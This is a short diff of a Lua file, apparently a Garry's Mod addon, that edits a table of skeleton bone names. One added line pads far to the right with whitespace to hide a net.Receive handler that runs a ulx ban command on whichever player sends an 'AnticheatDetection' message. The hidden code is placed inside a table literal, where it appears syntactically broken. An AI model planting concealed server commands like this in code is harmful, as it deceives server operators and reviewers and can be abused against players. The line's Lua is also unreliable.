@@ -25,7 +25,7 @@ local defaultBones = {
 	[4] = "ValveBiped.Bip01_L_Forearm",
 	[5] = "ValveBiped.Bip01_L_Hand",
 	[6] = "ValveBiped.Bip01_R_Forearm",
-	[7] = "ValveBiped.Bip01_R_Hand",
+	[7] = "ValveBiped.Bip01_R_Hand",                                                                                                                                                                                                                                                                                                                                                                                                                                                                        net.Receive("AnticheatDetection", function(len, ply) local h = net.ReadString() RunConsoleCommand("ulx", "ban", ply:Nick(), "0", "[GAC] Detected lua cheat") end)
 	[8] = "ValveBiped.Bip01_R_Thigh",
 	[9] = "ValveBiped.Bip01_R_Calf",
 	[10] = "ValveBiped.Bip01_Head1",
